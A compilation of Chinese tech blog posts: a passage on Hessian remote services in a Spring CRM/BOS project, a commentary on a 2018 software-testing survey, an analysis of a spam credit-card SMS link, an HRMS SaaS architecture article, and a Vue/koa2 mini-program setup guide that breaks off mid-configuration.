    <!-- 通过配置的方式对外发布服务 -->    <!-- 业务接口实现类  -->    <bean id="customerService" class="cn.itcast.crm.service.impl.CustomerServiceImpl" />    <!-- 注册hessian服务 -->    <bean id="/customer" class="org.springframework.remoting.caucho.HessianServiceExporter">        <!-- 业务接口实现类 -->        <property name="service" ref="customerService" />        <!-- 业务接口 -->        <property name="serviceInterface" value="cn.itcast.crm.service.CustomerService" />    </bean>
第七步：发布crm服务第八步：在hessian_client客户端调用crm服务获得客户数据注意：拷贝接口CustomerService代码文件放到客户端中，同时必须在hessian_client客户端新建和crm服务端一样的实体Bean目录，如下图所示：




hessian_client客户端调用代码如下：
package com.itheima;import java.net.MalformedURLException;import java.util.List;import org.junit.Test;import com.caucho.hessian.client.HessianProxyFactory;import cn.itcast.crm.domain.Customer;public class TestService {    @Test    public void test1() throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        CustomerService proxy = (CustomerService) factory.create(CustomerService.class, "http://localhost:8080/crm/remoting/customer");        List<Customer> list = proxy.findnoassociationCustomers();        for (Customer customer : list) {            System.out.println(customer);        }        // 上面的演示方式：我们手动创建一个代理对象，通过代理对象去调用，然后获取服务端发布的客户数据。        // 实际的开发方式：我们只需要在applicationContext.xml中配置一下，由spring工厂帮我们去创建代理对象，再将该代理对象注入给action去使用它即可。        // 如何配置呢？配置相关代码如下：        /*        <!-- 配置远程服务的代理对象 -->        <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">            <property name="serviceInterface" value="cn.itcast.bos.service.ICustomerService"/>            <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>        </bean>        */    }}
客户端控制台输出：
cn.itcast.crm.domain.Customer@59b746fcn.itcast.crm.domain.Customer@20f92649cn.itcast.crm.domain.Customer@45409388cn.itcast.crm.domain.Customer@1295e93dcn.itcast.crm.domain.Customer@3003ad53cn.itcast.crm.domain.Customer@41683cc5cn.itcast.crm.domain.Customer@226dcb0fcn.itcast.crm.domain.Customer@562e5771
服务端控制台输出：
Hibernate:     select        customer0_.id as id0_,        customer0_.name as name0_,        customer0_.station as station0_,        customer0_.telephone as telephone0_,        customer0_.address as address0_,        customer0_.decidedzone_id as decidedz6_0_     from        t_customer customer0_     where        customer0_.decidedzone_id is null
4.2、在bos项目中调用crm服务获得客户数据
第一步：在bos项目中导入hessian的jar包第二步：从crm项目中复制CustomerService接口和Customer类到bos项目中第三步：在spring配置文件中配置一个远程服务代理对象，调用crm服务
    <!-- 配置远程服务的代理对象 -->    <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">        <property name="serviceInterface" value="com.itheima.bos.crm.CustomerService"/>        <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>    </bean>
第四步：将上面的代理对象通过注解方式注入到BaseAction中
    @Autowired     protected CustomerService customerService;
第五步：为定区列表页面中的“关联客户”按钮绑定事件，发送2次ajax请求访问DecidedzoneAction，在DecidedzoneAction中调用hessian代理对象，通过代理对象可以远程访问crm获取客户数据，获取数据后进行解析后，填充至左右下拉框中去
    // 设置全局变量：存储选中一个定区时的 定区id    var decidedzoneid;    // 关联客户窗口    function doAssociations(){        // 在打开关联客户窗口之前判断是否选中了一个定区，即获得选中的行        var rows = $("#grid").datagrid("getSelections");        if (rows.length == 1) {            // 打开窗口            $("#customerWindow").window('open');            // 清空窗口中的下拉框内容            $("#noassociationSelect").empty();            $("#associationSelect").empty();            // 发送ajax请求获取未关联到定区的客户(左侧下拉框)            var url1 = "${pageContext.request.contextPath}/decidedzoneAction_findnoassociationCustomers.action";            $.post(url1, {}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至左侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#noassociationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');            decidedzoneid = rows[0].id;            // 发送ajax请求获取关联到当前选中定区的客户(右侧下拉框)            var url2 = "${pageContext.request.contextPath}/decidedzoneAction_findhasassociationCustomers.action";            $.post(url2, {"id":decidedzoneid}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至右侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#associationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');        } else {            // 没有选中或选中多个，提示信息            $.messager.alert("提示信息","请选择一条定区记录进行操作","warning");        }    }
第六步：为“左右移动按钮”绑定事件
    <td>        <input type="button" value="》》" id="toRight"><br/>        <input type="button" value="《《" id="toLeft">        <script type="text/javascript">            $(function() {                // 为右移动按钮绑定事件                $("#toRight").click(function() {                    $("#associationSelect").append($("#noassociationSelect option:selected"));                    $("#associationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });                // 为右移动按钮绑定事件                $("#toLeft").click(function() {                    $("#noassociationSelect").append($("#associationSelect option:selected"));                    $("#noassociationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });            });        </script>    </td>
第七步：为关联客户窗口中的“关联客户”按钮绑定事件
<script type="text/javascript">    $(function() {        // 为关联客户按钮绑定事件        $("#associationBtn").click(function() {            // 在提交表单之前，选中右侧下拉框中所有的选项            $("#associationSelect option").attr("selected", "selected"); // attr(key, val) 给一个指定属性名设置值            // 在提交表单之前设置隐藏域的值（定区id）            $("input[name=id]").val(decidedzoneid);            // 提交表单            $("#customerForm").submit();        });    });</script>
第八步：在定区Action中接收提交的参数，调用crm服务实现定区关联客户的业务功能
    // 采用属性驱动的方式，接收页面提交过来的参数customerIds（多个，需要用到数组进行接收）    private Integer[] customerIds;    public void setCustomerIds(Integer[] customerIds) {        this.customerIds = customerIds;    }    /**     * 将未关联定区的客户关联到定区上     * @return     */    public String assignCustomersToDecidedZone() {        customerService.assignCustomersToDecidedZone(customerIds, model.getId());        return "list";    }

********************************************************************************************************************************************************************************************************
解析！2018软件测试官方行业报告
前段时间，来自QA Intelligence的2018年度软件测试行业年度调查报告已经隆重出炉了。
《软件测试行业现状报告》旨在为测试行业和全球测试社区提供最准确的信息，是全球最大的测试行业调研报告，来自80多个国家的约1500名受访者参与了此次调研。
这份报告针对软件测试的年度行业现状进行了调研，并给出了非常具体的数据统计。对于软件测试从业人员而言，是一个很好的可以用来了解行业趋势、职业状态的窗口，能为我们职业发展的方向提供强有力的数据支撑。
下面就跟大家一起来解析这份报告都告诉了我们一些什么事情。
 
1.　　首先我们关注的是，测试人员的入行途径：

解析：
可以看到相当部分的入行者对于软件测试这个行业有着直观的兴趣，并且很多是从其他行业和职位转行而来。这说明软件测试工程师这样的职位越来越被知晓和了解，而且对于这个行业很多人持看好的态度。
 
2.　　测试工作占工作时间的百分比：

解析：
这个数据统计分析的潜台词其实是：“软件测试人员是否是专职测试”。从图标中的高占比可以看出，独立专职的测试仍然是业界主流。
 
3.　　测试人员的薪资状况：
 
解析：
我们最关注的当然是中国测试从业人员的薪资，从图表中我们可以明显看出，中国测试从业人员的起步薪资处在比较低的水平。但随着经验的积累，大于五年经验的测试工程师在薪资水平上有可观的提升。整体薪资虽然只是北美和西欧的一半左右，但是也处在一个比较不错的水准。
 
4.　　软件测试的职能定位和团队规模：

解析：
可以看到，测试团队的规模正在逐渐呈现缩减的状态。这与IT行业本身的发展大趋势保持一致，研发节奏的加快，敏捷理念的普遍应用，都使得小规模的团队构成变得越来越流行。
这一行业现状也可以解释测试人员正越来越多的受到项目经理和开发经理的直接领导。
 
5.　　测试人员的额外工作：
 
 
解析：
自动化测试工作的高占比是一个很好的现象，也说明了自动化测试技术在项目内受到了更多的重视和成功应用。而其他工作的高占比也说明，软件测试职位正在渐渐摆脱传统的误解和偏见--即将软件测试简单的与功能测试和测试执行等同起来的偏见。
 
6.　　测试方法和方法论：
 
 
 
解析：
探索性/基于会话的测试仍然是测试方法中的主流。值得注意的是，一些比较新的尝试方法已经在实际工作环境中得到了应用。
 
7.　　静态测试：
 
 
解析：
测试人员对于静态测试，各种评审会议的投入明显增加。
 
8.　　测试人员技能提升方法：

解析：
可以看出，测试人员在技能提升这个领域里，对书籍的依赖有所降低。
 
9.　　测试人员需要的技能：

解析：
沟通能力，自动化技术能力，通用测试方法论占据了前三甲。这些能力你掌握得怎么样呢？
 
10.　　软件测试的对象：
 
解析：
网页测试项目仍然是最主流，而手机项目所占比重已经令人惊讶的超过了桌面应用。网页，APP相关的测试技能是我们测试从业人员的攻坚重点。
 
11.　　软件开发模式：
 
 
解析：
敏捷和类敏捷型项目已经占到了已经极高的百分比，而DevOps模式的使用已经持续数年稳定增长，看来DevOps有必要成为我们测试进修课程上的必备项目。
 
 12.　　自动化测试的应用趋势：

解析：
自动化测试在研发项目里被使用的比例基本保持稳定，而85%的高占比很好的体现了自动化技术的流行。我们还能看出，自动化技术应用最广的领域仍然是功能和回归测试方面。
 
最后我们来看看测试经理对于测试人员素质最关注的要点：

想要转行从业测试，或者想要跳槽寻求进一步发展的同学，可以关注一下这些内容啦。
 
好了，2018行业报告的解析就到这里，希望可以对从业测试的你有所帮助和启发！
 
********************************************************************************************************************************************************************************************************
记录一次垃圾短信网站短链分析
 
垃圾办信用卡短信数据分析

最近天天收到叫我办理某银行的信用卡的短信，让我们感觉和真的一样，其实，很多都是套路，都是别人拿来套用户的信息的。下面我们来看下短信


常理分析
分析一下下面这条短信，首先乍一看这个短信好像很真实的感觉，广发银行，并且带有申请链接。并且号码并不是手机号码，而是短信中心的号码。
深度分析


上网查询该中心号码：



 

可以断定该短信为垃圾短信了



网址分析
通过浏览器访问打开短信中的链接可以看到如下页面跳转



有以下操作：


http://t.cn/EhuFsFj 请求短连接


http://b1.callaso.cn:8181/dcp/tDcpClickLogController.do?tourl&mobile=MTg5NzkxOTg2NTM%3D&destUrl=http%3A%2F%2Fa1.callaso.cn%2Fguangfaxyk_sh_n.html%3Fxbd1008_dpi_c10_zg_gf_7w


 短连接跳转到该网站，应该是一个呗用来做日志请求的


http://s13.cnzz.com/z_stat.php?id=1274023635&online=1 :该网站用于数据统计


http://online.cnzz.com/online/online_v3.php?id=1274023635&h=z7.cnzz.com&on=1&s= ：统计在线时长


http://95508.com/zct7uhBO 访问广发申请信用卡页面


https://wap.cgbchina.com.cn/creditCardApplyIn.do?seqno=cTxRTfSvURuypt-PwsdceQ4a9bBB4b549Bb95Ba9Z&orginalFlowNo=Y6wzfeQcRUxTdvPtu7-wSfyps9m14a49BbB1BbBBB9_DB&createTime=R9tRPRs-TSUdQfpcey14_4B49b_9DaBby&ACTIVITY_ID=lSMTfyRfePpcsS-Qd99BDBBBBB_1b： 跳转广发信用卡申请中心页面


以上是一个请求过程，其实这个过程大概是这样，短连接->请求真实网址->进行网站数据统计->跳转广发申请信用卡页面，然后你再去填写相关信息。
 


其中危机：


由于为短连接，可能黑客可能在中途拦截，或者注入一些抓取数据的脚本，导致用户信息泄露


当你访问该网站时候，你的用户的IP会被CNZZ统计


虽然说现在该网站最终请求的是一个真正的广发银行信用卡申请的网站，这是推广的一个网站



思考


现在的垃圾短信众多，其实办理信用卡的短信一般也不会发送到你的手机上，一般这种短信百分之90都是假的，要么是套取你的个人信息，要么就是推荐你办理信用卡赚取佣金的



********************************************************************************************************************************************************************************************************
HRMS(人力资源管理系统)-SaaS架构设计-概要设计实践
一、开篇
      前期我们针对架构准备阶段及需求分析这块我们写了2篇内容《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》内容来展开说明。
       本篇主将详细的阐述架构设计过程中概要架构设计要点来和大家共同交流，掌握后续如何强化概要架构设计在架构设计中作用，帮助我们快速确认架构的方向及核心大框架。
      在阐述具体的概要架构工作方法之前，还请大家先参考我们限定的业务场景：
     1、HRMS系统的介绍？（涵盖哪些功能？价值和作用是什么？行业什么情况？）
      请阅读《HRMS(人力资源管理系统)-从单机应用到SaaS应用-系统介绍》
      2、本章分析的内容将围绕4类企业代表的业务场景，（区分不同规模企业的关注点，规模将决定系统的设计方案）
      本篇将围绕4类企业代表来阐述不同规模企业对于HRMS的需求及应用

      A、100人以下的中小企业
      B、500人以下的大中型企业
      C、1000人以上的集团化大企业
      D、全球类型的公司体系（几万人）

      3、架构师在设计该系统时的职责及具备的核心能力是什么？
      请阅读《系统架构系列-开篇介绍》
 
一、关于概要架构阶段
 
1.1、概要架构的定义
       概念架构就是对系统设计的最初构想，就是把系统最关键的设计要素及交互机制确定下来，然后再考虑具体的技术应用，设计出实际架构。概念架构阶段主抓大局，不拘小节，不过分关注设计实现的细节内容。
       概要架构阶段的特点：

Ø满足“架构=组件+交互”的基本定义(所有架构都逃离不了该模式)
Ø对高层组件的“职责”进行笼统界定，并给出高层组件的相互关系
Ø不应涉及接口细节

在讲具体的概要架构设计实践之前，请大家思考以下问题：

Ø不同系统的架构，为什么不同？
Ø架构设计中，应何时确立架构大方向的不同？（功能、质量、约束
 

1.2、行业现状
1.2.1、误将“概要架构”等同于“理想架构”

架构设计是功能需求驱动的，对吗？
架构设计是用例驱动的，对吗？
实际上架构设计的驱动力：功能+质量+约束

1.2.2、误把“阶段”当“视图”

概要架构阶段还是概念视图？
阶段体现先后关系，视图体现并列关系
概要架构阶段根据重大需求、特殊需求、高风险需求形成稳定的高层架构设计成果
 

1.3、主要工作内容及目标

       概念架构是一个架构设计阶段，必须在细化架构设计阶段之前，针对重大需求，特色需求、高风险需求、形成文档的高层架构设计成果。
       重大需求塑造概念架构，这里的重大需求涵盖功能、质量、约束等3类需求的关键内容。
       如果只考虑功能需求来设计概念架构，将导致概念架构沦为“理想化的架构”，这个脆弱的架构不久就会面临“大改”的压力，甚至直接导致项目失败。
 
二、概要架构阶段的方法及科学实践过程是什么？
 

整体可分为3个阶段：

1、通过鲁棒图：初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图
2、高层分割：运用成熟的经验及方法论，结合场景选择合适的架构模式来确定系统的层级关系
3、质疑驱动：考虑非功能性需求来不断驱动概要架构设计过程。

2.1、初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图

鲁棒图的三种对象：

•边界对象对模拟外部环境和未来系统之间的交互进行建模。边界对象负责接 收外部输入、处理内部内容的解释、并表达或传递相应的结果。
•控制对象对行为进行封装，描述用例中事件流的控制行为。
•实体对象对信息进行描述，它往往来自领域概念，和领域模型中的对象有良好的对应关系。

初步设计原则

•初步设计的目标是“发现职责”，为高层切分奠定基础
•初步设计“不是”必须的，但当“待设计系统”对架构师而言并无太多直接 经验时，则强烈建议进行初步设计
•基于关键功能（而不是对所有功能）、借助鲁棒图（而不是序列图，序列图太细节）进行初 步设计


       关于这几个对象的区别，请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中有描述鲁棒图的基本用法说明。后续本文将直接使用不再复述具体的用法。
       大家看完鲁棒图发现鲁棒图也有实体、控制及边界对象，怎么这么类似web系统时用到的MVC模式，那么我们这里对比下这2个模式的异同点:

       通过上面的对比我们发现，鲁棒图能够更全面的体现架构设计过程中涉及的内容，单独的架构模式更侧重其中的部分架构层次，比如逻辑架构采取MVC的模式。
2.2、高层分割（概念架构形成的具体操作方法）
1）、直接分层

2）、先划分为子系统，再针对每个子系统分层

针对高层分割，我们可以采取分阶段的模式来进行落地实践：

1、直接划分层次：直接把系统划分为多个层次，梳理清晰各层次间的关联关系
2、分为2个阶段：先划分为多个子系统，然后再梳理子系统的层次，梳理清晰没格子系统的层次关系

针对分层模式的引入，这里分享几类划分模式及方法：

1、逻辑层：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性
2、物理层：分布部署在不同机器上
3、通用性分层：通用性越多，所处层次越靠下

 
2.2.1、Layer：逻辑层
Layer：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性。Layer是逻辑上组织代码的形式。比如逻辑分层中表现层，服务层，业务层，领域层，他们是软件功能来划分的。并不指代部署在那台具体的服务器上或者，物理位置。

        多层Layer架构模式
       诸如我们常见的三层架构模式，三层架构(3-tier architecture) 通常意义上的三层架构就是将整个业务应用划分为：界面层（User Interface layer）、业务逻辑层（Business Logic Layer）、数据访问层（Data access layer）。区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构。微软推荐的分层式结构一般分为三层，从下至上分别为：数据访问层、业务逻辑层（又或称为领域层）、表示层。
逻辑层次的架构能帮助我们解决逻辑耦合，达到灵活配置，迁移。 一个良好的逻辑分层可以带来：

A、逻辑组织代码/代码逻辑的清晰度
B、易于维护（可维护性）
C、代码更好的重用（可重用性）
D、更好的团队开发体验（开发过程支持）
 

2.2.2、Tier：物理层
Tier：物理层，各分层分布部署在不同机器上，Tier这指代码运行部署的具体位置，是一个物理层次上的划为，Tier就是指逻辑层Layer具体的运行位置。所以逻辑层可以部署或者迁移在不同物理层，一个物理层可以部署运行多个逻辑层。

       Tier指代码运行的位置，多个Layer可以运行在同一个Tier上的，不同的Layer也可以运行在不同的Tier上，当然，前提是应用程序本身支持这种架构。以J2EE和.NET平台为例，大多数时候，不同的Layer之间都是直接通过DLL或者JAR包引用来完成调用的（例如：业务逻辑层需要引用数据访问层），这样部署的时候，也只能将多个Layer同时部署在一台服务器上。相反，不同的Layer之间如果是通过RPC的方式来实现通信调用的，部署的时候，便可以将不同的Layer部署在不同的服务器上面，这也是很常见的解耦设计。 
一个良好的物理架构可以带来：

A、性能的提升 
B、可伸缩性 
C、容错性
D、安全性

2.2.3、通用性分层
采取通用性分层模式，原则是通用性越多，所处层次越靠下

并且各层的调用关系是自上而下的，越往下通用性越高。
2.3、质疑驱动，不断完善系统架构（质量属性及约束决定了架构的演变）
基于系统中的重大功能来塑造概念架构的高层框架，过程中需要通过质量及约束等非功能性需求不断质疑初步的概念架构，逐步让这个概念架构完善，能够满足及支撑各类质量及约束的要求。具体的操作方法我们可以采取之前篇幅《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中介绍的 “目标-场景-决策表” 来实现。
Ø通过“目标-场景-决策表”分析非功能需求：

通过分析关键的质量及约束内容，给出具体的场景及应对策略，梳理出清晰的决策表，在概念架构阶段融合决策表中给出的方案，最终给出初步的概念架构设计。
 
三、基于前面分析的HRMS系统？我们如何下手开始？
结合前面讲的需求梳理的要点内容，我们结合HRMS系统来进行应用实践，逐步形成概要架构设计。
A、基于RelationRose 来画出鲁棒图、确定系统的边界及关键内容
1)、分析系统中的参与者及应用功能边界：

基于上面我们能够发现我们的核心功能点：

组织管理：主要实现对公司组织结构及其变更的管理；对职位信息及职位间工作关系的管理，根据职位的空缺进行人员配备；按照组织结构进行人力规划、并对人事成本进行计算和管理，支持生成机构编制表、组织结构图等
人事档案：主要实现对员工从试用、转正直至解聘或退休整个过程中各类信息的管理，人员信息的变动管理，提供多种形式、多种角度的查询、统计分析手段
劳动合同：提供对员工劳动合同的签订、变更、解除、续订、劳动争议、经济补偿的管理。可根据需要设定试用期、合同到期的自动提示
招聘管理：实现从计划招聘岗位、发布招聘信息、采集应聘者简历，按岗位任职资格遴选人员，管理面试结果到通知试用的全过程管理
薪酬福利：工资管理系统适用于各类企业、行政、事业及科研单位，直接集成考勤、绩效考核等数据，主要提供工资核算、工资发放、经费计提、统计分析等功能。支持工资的多次或分次发放；支持代扣税或代缴税；工资发放支持银行代发，提供代发数据的输出功能，同时也支持现金发放，提供分钱清单功能。经费计提的内容和计提的比率可以进行设置；福利管理系统提供员工的各项福利基金的提取和管理功能。主要包括定义基金类型、设置基金提取的条件，进行基金的日常管理，并提供相应的统计分析，基金的日常管理包括基金定期提取、基金的补缴、转入转出等。此外，提供向相关管理机关报送相关报表的功能
行政管理：主要提供对员工出勤情况的管理，帮助企业完善作业制度。主要包括各种假期的设置、班别的设置、相关考勤项目的设置，以及调班、加班、公出、请假的管理、迟到早退的统计、出勤情况的统计等。提供与各类考勤机系统的接口，并为薪资管理系统提供相关数据。支持通知公告分发，支持会议室/车辆等资源预定并同步日历，支持调研和投票问卷，支持活动管理的报名/签到/统计等，支持人员的奖惩管理并与人事档案关联，支持活动的抽奖管理等
培训管理：根据岗位设置及绩效考核结果，确定必要的培训需求；为员工职业生涯发展制定培训计划；对培训的目标、课程内容、授课教师、时间、地点、设备、预算等进行管理，对培训人员、培训结果、培训费用进行管理
绩效管理：通过绩效考核可以评价人员配置和培训的效果、对员工进行奖惩激励、为人事决策提供依据。根据不同职位在知识、技能、能力、业绩等方面的要求，系统提供多种考核方法、标准，允许自由设置考核项目，对员工的特征、行为、工作结果等进行定性和定量的考评
配置管理：系统中为了增强系统的兼容性及灵活性，增加了诸多系统开关及配置，为后续满足各类场景提供支撑。其中需要有配置项的动态分类、动态增加、修改等功能
权限管理：
通用权限管理系统，支撑组织、员工、角色、菜单、按钮、数据等涵盖功能及数据全面的权限管理功能
流程管理：提供工作流引擎服务，支持自定义表单及流程，全面支撑HRMS系统中的审批流。
人力资源规划分析：提供全方位的统计分析功能，满足企业人力资源管理及规划，为后续的经营决策提供数据依据。

2)、系统边界
基于上述核心功能点，我们可以梳理出系统的边界，包含如下几个方面：

i、管理员的系统边界
       由于管理员的角色定位已经做了限定，所以他需要有专门的运维管理后台，这个后台提供的功能和业务操作人员的后台功能和界面是完全不同的，所以需要单独的入口，其中的功能模块也是有区别的。所以我们可以得出管理员使用系统时的接入方式和边界。
ii、HR的系统边界
       HR的角色承担业务管理的相关职责，诸如HR模块中的审批环节，他们既有业务发起的操作又有审批环节的操作，所以相对来说HR角色的使用边界会更广泛，相比员工来说。我们发现HR在使用时需要有单独的系统入口，并且分配给他们对应的业务模块及功能。
iii、员工的系统边界
       对于员工来说，HRMS系统中只有部分模块式可以操作使用的，诸如考勤、报销、绩效、查看及维护个人信息等，其他的信息都是由HR填写后用户可以查看，所以从操作便捷来看，员工与HR在业务系统入口上可以是统一入口，通过权限来限制访问边界即可。
iv、公司管理者的边界
        公司的管理者相比员工具有相应的业务及数据管理权限，同时会在审批流环节中承担审核者的身份，诸多业务流程都和管理者相关，所以相比员工来说，公司管理者的业务及操作权限较大，更多的上下级管理方面的业务内容较多，同时还可以完成员工角色操作的相关业务。
3)、数据对象

i、基础数据：系统包含的元数据、服务管理、日志、模块、基础配置、数据字典、系统管理等基础数据管理
ii、业务数据：涵盖机构、员工、HRMS系统业务及流程数据、外部第三方业务联动数据等
iii、其他数据：涵盖诸如文件、图片、视频等其他类型的数据；统计分析后的结果数据；与第三方系统交互或留存的数据等相关内容。其他诸如log日志等数据信息。
B、划分高层子系统

       我们基于上面鲁棒图分析后的核心需求，我们给出系统的宏观的架构轮廓，这里仅考虑用户角色及职责链、从而形成上述的高层分割。
C、质量需求影响架构的基本原理：进一步质疑
       结合前面我们已经梳理过的关键的质量及约束，具体请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》，由于篇幅关系我就不详细列举，下面基于这些质量属性及约束我们来进一步完善概要架构：
1)、考虑关键质量属性中的持续可用性及可伸缩性，得出概要架构的中间成果：

2)、考虑关键质量属性中的互操作性，进一步优化概要架构的中间成果：

3)、考虑高性能，除了高负载，还需要考虑静态化、缓存等提升系统性能：

       上面基本形成了一个概要架构的雏形，不过这还不够，我们还有一项关键的内容没有分析，那就是系统约束，我们需要将之前明确的关键约束进行分析拆解，转化为功能或质量要求：
D、分析约束影响架构的基本原理：直接制约、转化为功能或质量需求

分析上述表格的内容，结合上几轮分析后给出的概要架构进行验证，看看这些约束会不会影响该架构内容，然后进行优化调整：

i、业务环境及约束：目前来看，上述概要架构可以支持,不会对于当前的概要架构造成影响。
ii、使用环境约束：之前拟定的PC、App端访问模式已考虑了上述的场景，关于多语言在应用层细节设计时考虑即可。
iii、开发环境约束：概要架构还不涉及细节内容，当前的约束也不会对于架构产生较大影响
iv、技术环境约束：无影响，属于细节层面

E、基于上面几部走，我们得到了初步的概要架构，基本上符合功能、质量及约束的各类要求及场景，得出以下概要架构设计图。

四、概要架构阶段要点总结
基于前面对于概要架构设计推演过程的实践，我们总结概要架构过程的3个核心要点内容如下：
1、首先，需要分析找到HRMS系统中的关键功能、质量及约束
2、其次，利用鲁棒图找到系统的用户、关键功能及职责链，形成初步的子系统的拆分、过程中借助高层分割形成分层结构，不断通过质疑+解决方案的模式，应对及完善质量及约束的要求。
3、最后，通过1、2步实践过程，最终推导出初步的概要架构，为下一步的细化架构提供基础。
希望大家通过上面示例的展示，为大家后续在系统架构设计实践的过程中提供一些帮助。
五、更多信息
关于更多的系统架构方面的知识，我已建立了交流群，相关资料会第一时间在群里分享，欢迎大家入群互相学习交流：
微信群：（扫码入群-名额有限）

********************************************************************************************************************************************************************************************************
Vue+koa2开发一款全栈小程序(5.服务端环境搭建和项目初始化）
1.微信公众平台小程序关联腾讯云
腾讯云的开发环境是给免费的一个后台，但是只能够用于开发，如果用于生产是需要花钱的，我们先用开发环境吧
1.用小程序开发邮箱账号登录微信公众平台
2.【设置】→【开发者工具】→第一次是git管理，开启腾讯云关联
3.会一路跳转到腾讯云的【开通开发环境】的流程要走

1.已经完成
2.下载安装微信开发者工具，也已经下载安装了
3.下载Node.js版本Demo
将demo中的server文件夹，复制到mpvue项目中
在项目下的project.config.json中，增加代码：

"qcloudRoot":"/server/",


 在server文件夹下的config.js中，在pass后填写Appid

 
 
 然后在微信开发者工具中，打开项目，点击右上角的【腾讯云】→【上传测试代码】
首次上传选【模块上传】，然后如图把相应的地方勾选，以后就选智能上传就可以了。

 2.搭建本地环境
1.安装MySQL数据库
2.配置本地server文件夹下的config.js，加入配置代码

    serverHost: 'localhost',
    tunnelServerUrl: '',
    tunnelSignatureKey: '27fb7d1c161b7ca52d73cce0f1d833f9f5b5ec89',
      // 腾讯云相关配置可以查看云 API 秘钥控制台：https://console.cloud.tencent.com/capi
    qcloudAppId: '你的appid',
    qcloudSecretId: '你的云api秘钥id',
    qcloudSecretKey: '你的云api秘钥key',
    wxMessageToken: 'weixinmsgtoken',
    networkTimeout: 30000,


 
 

获取云api秘钥id和key地址：https://console.cloud.tencent.com/capi


获取appid的地址：https://console.cloud.tencent.com/developer

 
 3.新建cAuth数据库
打开MySQL控制台，执行命令

create database cAuth;

 数据库名cAuth，是与server项目中保持一致。
如果本地的MySQL设置了密码，将server文件下的config.js中的数据库密码配置，填写你mysql数据库的密码

 
4.启动server服务端
打开cmd，cd到server项目目录下，执行

cnpm install

 

cnpm install -g nodemon

5.测试一下本地环境是否搭建好了
在server项目下controllers目录下，新建demo.js文件

module.exports=async(ctx)=>{
    ctx.state.data={
        msg:'hello 小程序后台'
    }
}

在server项目目录下的router目录下的index.js中添加路由

router.get('/demo',controllers.demo)


 
 然后执行运行server项目的命令

npm run dev //启动server项目

浏览器访问

http://localhost:5757/weapp/demo

.
 
 
 
3.项目初始化
1.新建mpvue项目 打开cmd，cd到想要存放项目的目录下

cnpm install -g vue-cli   //安装脚手架
vue init mpvue/mpvue-quickstart mydemo
Project name mydemo
wxmp appid //登录微信小程序后台，找到appid
//然后全都默认即可

cd mydemo
cnpm install
npm run dev//启动新建的mpvue项目

2.用vscode打开mydemo项目
1.将图片素材库文件夹img复制到mydemo/static目录下
2.在src目录下，新建me目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue

<template>
    <div>
        个人中心页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

3.在src目录下，新建books目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        图书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

4.在src目录下，新建comments目录，目录下新建mian.js和index.vue
main.js代码

import Vue from 'vue'
import App from './index'

const app = new Vue(App)
app.$mount()

index.vue代码

<template>
    <div>
        评论过的书页面
    </div>
</template>
<script>
export default {
    

}
</script>
<style>
    
</style>

嗯，是的，3，4，5步骤中，main.js 的代码是一样的，index.vue代码基本一样
5.防止代码格式报错导致项目无法启动，先到项目目录下的build目录下的webpack.base.conf.js中，将一段配置代码注释掉

6.在mydemo项目下的app.json中修改添加配置代码
app.json代码

{
  "pages": [
    "pages/books/main", //将哪个页面路径放第一个，哪个页面就是首页，加^根本不好使，而且还报错
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  }

  
}

7.在cmd中重启mydemo项目，在微信开发者工具中打开

 
 3.底部导航
1.微信公众平台小程序全局配置文档地址

https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#全局配置

2.根据官方文档，在app.json填写底部导航配置代码

{
  "pages": [
    "pages/books/main",
    "pages/comments/main",
    "pages/me/main",
    "pages/index/main",
    "pages/logs/main",
    "pages/counter/main"
  ],
  "window": {
    "backgroundTextStyle": "light",
    "navigationBarBackgroundColor": "#EA5149",
    "navigationBarTitleText": "蜗牛图书",
    "navigationBarTextStyle": "light"
  },
  "tabBar": {
    "selectedColor":"#EA5149",
    "list": [{

      "pagePath": "pages/books/main",
      "text": "图书",
      "iconPath":"static/img/book.png",
      "selectedIconPath":"static/img/book-active.png"
    },
    {

      "pagePath": "pages/comments/main",
      "text": "评论",
      "iconPath":"static/img/todo.png",
      "selectedIconPath":"static/img/todo-active.png"
    },
    {

      "pagePath": "pages/me/main",
      "text": "我",
      "iconPath":"static/img/me.png",
